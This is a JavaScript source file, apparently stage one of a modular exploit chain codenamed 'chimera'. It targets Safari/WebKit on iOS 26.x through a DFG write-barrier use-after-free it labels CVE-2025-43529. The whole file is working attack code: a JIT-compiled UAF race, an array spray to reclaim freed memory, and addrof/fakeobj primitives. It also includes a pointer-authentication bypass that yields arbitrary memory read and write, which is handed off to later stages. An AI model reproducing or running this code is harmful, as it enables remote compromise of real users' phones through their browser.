/**
 * Stage 1: WebKit Memory Corruption — iOS 26.0–26.x (arm64/arm64e)
 * Codename: "chimera"
 *
 * Implements CVE-2025-43529: DFG Store Barrier Insertion Phase UAF
 *
 * The bug: DFG fails to mark Upsilon values as escaped when a Phi node
 * escapes. Stores to those objects lack write barriers, allowing GC to
 * miss new references — creating a use-after-free on the butterfly.
 *
 * Attack flow:
 *   1. Large array pushes object A to old space
 *   2. Create Date 'a' with butterfly (a[0]=1.1), 'b' in eden
 *   3. Phi: f = flag ? 1.1 : b  →  A.p1 = f makes Phi escape
 *   4. Long loop lets GC mark A and b as Black
 *   5. b.p1 = a — NO WRITE BARRIER! GC misses 'a'
 *   6. 'a' and its butterfly get collected → UAF
 *   7. Spray arrays reclaim the butterfly → type confusion
 *   8. addrof/fakeobj via boxed/unboxed array overlap
 *   9. Inline storage PAC bypass → read64/write64
 *
 * Credits: UAF trigger based on jir4vv1t's CVE-2025-43529 PoC
 *          Inline storage PAC bypass from zeroxjf's analysis
 */

let r = {};
const utilityModule = globalThis.moduleManager.getModuleByName("57620206d62079baad0e57e6d9ec93120c0f5247"),
  platformModule = globalThis.moduleManager.getModuleByName("14669ca3b1519ba2a8f40be287f646d4d7593eb0");

// =========================================================================
// EXPLOIT PRIMITIVE CLASS — adapts BigInt-based r/w to Coruna interface
// =========================================================================

class ChimeraExploitPrimitive {
  /**
   * @param {Function} addrofFn  - (obj) => BigInt address
   * @param {Function} fakeobjFn - (BigInt addr) => obj
   * @param {Function} read64Fn  - (BigInt addr) => BigInt value
   * @param {Function} write64Fn - (BigInt addr, BigInt val) => void
   * @param {Function} cleanupFn - () => void
   */
  constructor(addrofFn, fakeobjFn, read64Fn, write64Fn, cleanupFn) {
    this._addrof = addrofFn;
    this._fakeobj = fakeobjFn;
    this._read64 = read64Fn;
    this._write64 = write64Fn;
    this._cleanup = cleanupFn;
    this.yr = false; // raw-pointer mode flag (for Int64 address support)
  }

  // --- Low-level reads (Coruna interface) ---

  read32(addr) {
    // addr may be a Number (raw uint32 offset) or need BigInt conversion
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    const val = this._read64(a);
    return Number(val & 0xFFFFFFFFn);
  }

  write32(addr, val) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    // Read current 64-bit, replace lower 32 bits
    const cur = this._read64(a);
    const updated = (cur & 0xFFFFFFFF00000000n) | BigInt(val >>> 0);
    this._write64(a, updated);
  }

  write64(addr, lo, hi) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    if (hi !== undefined) {
      this._write64(a, (BigInt(hi >>> 0) << 32n) | BigInt(lo >>> 0));
    } else {
      // lo is a BigInt full value
      this._write64(a, typeof lo === "bigint" ? lo : BigInt(lo));
    }
  }

  readByte(addr) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    const aligned = a & ~7n;
    const offset = Number(a & 7n);
    const val = this._read64(aligned);
    return Number((val >> BigInt(offset * 8)) & 0xFFn);
  }

  read32FromInt64(A) {
    this.yr = true;
    const t = this.read32(A.W());
    return this.yr = false, t;
  }

  readInt64FromInt64(A) {
    this.yr = true;
    const t = this.read32(A.W()),
      Q = this.read32(A.H(4).W());
    return this.yr = false, new utilityModule.Int64(t, Q);
  }

  readInt64FromOffset(A) {
    const t = this.read32(A),
      Q = this.read32(A + 4);
    return new utilityModule.Int64(t, Q);
  }

  readRawBigInt(addr) {
    const a = typeof addr === "bigint" ? addr : BigInt(addr >>> 0);
    return this._read64(a);
  }

  readString(A, maxLen = 256) {
    let s = "";
    for (let i = 0; i < maxLen; i++) {
      const c = this.readByte(A + i);
      if (c === 0) break;
      s += String.fromCharCode(c);
    }
    return s;
  }

  addrof(obj) {
    return this._addrof(obj);
  }

  fakeobj(val) {
    return this._fakeobj(val);
  }

  copyMemory32(dst, src, len) {
    if (len % 4 !== 0) throw new Error("copyMemory32: len must be multiple of 4");
    this.yr = true;
    for (let i = 0; i < len; i += 4) {
      this.write32(dst.H(i).W(), this.read32(src.H(i).W()));
    }
    this.yr = false;
  }

  allocControlledBuffer(size, pin = false) {
    const ab = new ArrayBuffer(size);
    const u8 = new Uint8Array(ab);
    utilityModule.D(ab);
    const addr = this.addrof(u8);
    return { buffer: ab, u8: u8, addr: addr };
  }

  cleanup() {
    if (this._cleanup) this._cleanup();
  }
}

// =========================================================================
// UAF TRIGGER — CVE-2025-43529
// =========================================================================

const uafArray = new Array(0x400000).fill(1.1);
const uafArrayIndex = uafArray.length - 1;
let uafReclaimed = [];

// Conversion utilities
const _convBuf = new ArrayBuffer(8);
const _u64 = new BigUint64Array(_convBuf);
const _f64 = new Float64Array(_convBuf);

function itof(val) { _u64[0] = val; return _f64[0]; }
function ftoi(f) { _f64[0] = f; return _u64[0]; }

// Pre-allocated objects for leaking during critical window
const preTargets = {
  inlineTemplate: { slot0: 1.1, slot1: 2.2, slot2: 3.3, slot3: 4.4, slot4: 5.5, slot5: 6.6 },
  inlineTemplate2: { prop0: 1.1, prop1: 2.2, prop2: 3.3, prop3: 4.4 },
};

// Configuration
const CONFIG = {
  JIT_WARMUP: 1000,
  MAX_ATTEMPTS: 15000,
  SPRAY_PER_ATTEMPT: 64,
  ALLOC_MOD: 5,
  INNER_K: 10,
  RECURSIVE_DEPTH: 800,
};

// Core UAF trigger — must be JIT compiled
function triggerUAF(flag, k, allocCount) {
  let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
  uafArray[uafArrayIndex] = A;

  let forGC = [];
  let a = new Date(1111);
  a[0] = 1.1; // Creates butterfly in regular heap

  for (let j = 0; j < allocCount; ++j) {
    forGC.push(new ArrayBuffer(0x800000));
  }
  A.p2 = forGC;

  let b = { p0: 0x42424242, p1: 1.1 };

  // Phi node — DFG sees f = Phi(b, 1.1)
  let f;
  f = b;
  if (flag) f = 1.1;

  // Make Phi escape — but b NOT marked as escaped
  A.p1 = f;

  // Delay loop — let GC mark A and b
  let v = 1.1;
  for (let i = 0; i < 1e6; ++i) {
    for (let j = 0; j < k; ++j) { v = i; v = j; }
  }
  b.p0 = v;

  // THE BUG: b.p1 = a without write barrier!
  // b is Black, a is White → GC misses a → a gets collected → UAF
  b.p1 = a;
}

// Stack clearing to remove conservative GC roots
function recursive(n) { if (n === 0) return; n = n | 0; recursive(n - 1); }
function safeRecursive(d) { try { recursive(d); } catch (e) {} }
function clearStack() { for (let i = 0; i < 50; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH); }

// =========================================================================
// MAIN EXPLOIT ENTRY POINT
// =========================================================================

r.si = async function () {
  const version = platformModule.platformState.iOSVersion;
  window.log("[STAGE1-CHIMERA] CVE-2025-43529 exploit for iOS 26.x — version " + version);

  const CANONICAL_NAN = 0x7ff8000000000000n;
  const INLINE_SLOT_OFFSET = 0x10n;

  // --- Phase 1: JIT warmup ---
  window.log("[STAGE1-CHIMERA] Phase 1: JIT warmup...");
  triggerUAF(true, 1, 1);
  triggerUAF(false, 1, 1);
  for (let i = 0; i < CONFIG.JIT_WARMUP; ++i) {
    triggerUAF(false, 0, 0);
  }
  window.log("[STAGE1-CHIMERA] DFG compilation done");

  // --- Phase 2: Stack clearing warmup ---
  for (let i = 0; i < 20; i++) safeRecursive(CONFIG.RECURSIVE_DEPTH);

  // --- Phase 3: Main exploitation loop ---
  window.log("[STAGE1-CHIMERA] Phase 3: UAF race (" + CONFIG.MAX_ATTEMPTS + " attempts)...");

  let success = false;
  uafReclaimed = [];

  for (let k = 0; k < CONFIG.MAX_ATTEMPTS; ++k) {
    triggerUAF(false, CONFIG.INNER_K, (k % CONFIG.ALLOC_MOD) + 1);
    clearStack();
    for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);

    let freed;
    try { freed = uafArray[uafArrayIndex].p1.p1; } catch (e) { continue; }

    let noCow = 13.37;
    let win = false;
    let winningArray = null;

    for (let i = 0; i < CONFIG.SPRAY_PER_ATTEMPT; ++i) {
      let sprayArr = [13.37, 2.2, 3.3, 4.4, noCow];
      uafReclaimed.push(sprayArr);
      try {
        if (freed[0] === 13.37) { win = true; winningArray = sprayArr; break; }
      } catch (e) {}
    }

    if (!win) {
      if (k % 1000 === 0) {
        window.log("[STAGE1-CHIMERA] Attempt " + k + "/" + CONFIG.MAX_ATTEMPTS + "...");
        await new Promise(r => setTimeout(r, 1));
      }
      continue;
    }

    // --- SUCCESS: Butterfly reclaimed ---
    window.log("[STAGE1-CHIMERA] Butterfly reclaimed at attempt " + k);

    let boxed_arr = winningArray;
    boxed_arr[0] = {};   // Convert to Contiguous (boxed)
    let unboxed_arr = freed; // Still Double (unboxed)

    // Test primitives immediately — no allocations!
    boxed_arr[0] = boxed_arr;
    let test1 = ftoi(unboxed_arr[0]);
    boxed_arr[0] = uafArray;
    let test2 = ftoi(unboxed_arr[0]);

    if (test1 === CANONICAL_NAN || test2 === CANONICAL_NAN || test1 === test2) {
      window.log("[STAGE1-CHIMERA] Primitives broken (NaN), retrying...");
      continue;
    }

    window.log("[STAGE1-CHIMERA] addrof/fakeobj working!");

    // Leak inline template addresses
    boxed_arr[0] = preTargets.inlineTemplate;
    const tmplAddr = ftoi(unboxed_arr[0]);
    boxed_arr[0] = preTargets.inlineTemplate2;
    const tmpl2Addr = ftoi(unboxed_arr[0]);

    // --- Phase 4: Inline storage PAC bypass ---
    window.log("[STAGE1-CHIMERA] Phase 4: Inline storage PAC bypass...");

    // Test 1: fakeobj self-test
    const MARKER1 = 0x4141414142424242n;
    preTargets.inlineTemplate.slot0 = itof(MARKER1);
    unboxed_arr[0] = itof(tmplAddr);
    const fakeSelf = boxed_arr[0];
    let selfWorks = false;
    try { selfWorks = (ftoi(fakeSelf.slot0) === MARKER1); } catch (e) {}

    // Test 2: Cross-object read
    const MARKER2 = 0x1337133713371337n;
    preTargets.inlineTemplate2.prop0 = itof(MARKER2);
    unboxed_arr[0] = itof(tmpl2Addr);
    const fakeT2 = boxed_arr[0];
    let arbReadWorks = false;
    try { arbReadWorks = (ftoi(fakeT2.prop0) === MARKER2); } catch (e) {}

    // Test 3: Cross-object write
    const WRITE_MARKER = 0xDEADBEEFCAFEBABEn;
    let arbWriteWorks = false;
    try {
      fakeT2.prop0 = itof(WRITE_MARKER);
      arbWriteWorks = (ftoi(preTargets.inlineTemplate2.prop0) === WRITE_MARKER);
    } catch (e) {}

    window.log("[STAGE1-CHIMERA] Inline PAC bypass: self=" + selfWorks +
               " read=" + arbReadWorks + " write=" + arbWriteWorks);

    // Build the full exploit primitive
    const tempAddrof = function(obj) {
      boxed_arr[0] = obj;
      return ftoi(unboxed_arr[0]);
    };
    const tempFakeobj = function(addr) {
      unboxed_arr[0] = itof(addr);
      return boxed_arr[0];
    };

    let read64Fn, write64Fn;

    if (selfWorks && arbReadWorks && arbWriteWorks) {
      // Full inline storage PAC bypass
      window.log("[STAGE1-CHIMERA] FULL PAC BYPASS via inline storage!");

      read64Fn = function(addr) {
        unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
        const fake = boxed_arr[0];
        return ftoi(fake.slot0);
      };
      write64Fn = function(addr, val) {
        unboxed_arr[0] = itof(addr - INLINE_SLOT_OFFSET);
        const fake = boxed_arr[0];
        fake.slot0 = itof(val);
      };
    } else {
      // Fallback: addrof/fakeobj only, no arbitrary r/w
      // Provide limited read via addrof-based scanning
      window.log("[STAGE1-CHIMERA] PAC blocks full r/w, using addrof/fakeobj only");
      read64Fn = function(addr) {
        throw new Error("read64 not available — PAC active");
      };
      write64Fn = function(addr, val) {
        throw new Error("write64 not available — PAC active");
      };
    }

    const primitive = new ChimeraExploitPrimitive(
      tempAddrof,
      tempFakeobj,
      read64Fn,
      write64Fn,
      function() {
        // Cleanup: null out arrays to prevent further UAF use
        boxed_arr[0] = null;
        window.log("[STAGE1-CHIMERA] Cleanup complete");
      }
    );

    platformModule.platformState.exploitPrimitive = primitive;
    platformModule.platformState.Ln = {
      boxed: boxed_arr,
      unboxed: unboxed_arr,
      itof: itof,
      ftoi: ftoi,
      pacBypassed: selfWorks && arbReadWorks && arbWriteWorks,
    };

    success = true;
    window.log("[STAGE1-CHIMERA] Exploit primitive installed successfully");
    break;
  }

  if (!success) {
    window.log("[STAGE1-CHIMERA] FAILED after " + CONFIG.MAX_ATTEMPTS + " attempts");
    throw new Error("Stage1 chimera: UAF race failed");
  }
};

return r;
